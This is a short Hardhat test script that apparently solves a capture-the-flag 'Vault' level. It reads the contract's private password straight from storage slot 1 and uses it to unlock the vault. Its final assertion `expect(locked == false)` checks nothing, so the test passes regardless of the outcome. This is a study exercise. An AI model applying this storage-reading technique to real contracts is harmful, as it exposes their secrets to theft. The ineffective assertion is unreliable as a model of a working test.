
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level8 = await hre.ethers.getContractFactory("Vault");
        const password = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
        const level8 = await Level8.deploy(ethers.utils.solidityPack(["bytes32"], [password]));
        await level8.deployed();
        console.log(
          `Level8 deployed at address ${level8.address}`
        )
        return {level8, owner, otherAccount};
    }

    /*
    Unlock the vault to pass the level!
    */
    describe("Solve", function() {
        it("Should solve level8", async function() {
            const {level8, owner, otherAccount} = await loadFixture(deployFallback);
            password = await ethers.provider.getStorageAt(level8.address, 1);
            await level8.connect(otherAccount).unlock(password)
            const locked = await level8.connect(owner).locked()
            expect(locked == false)
        })
    });
});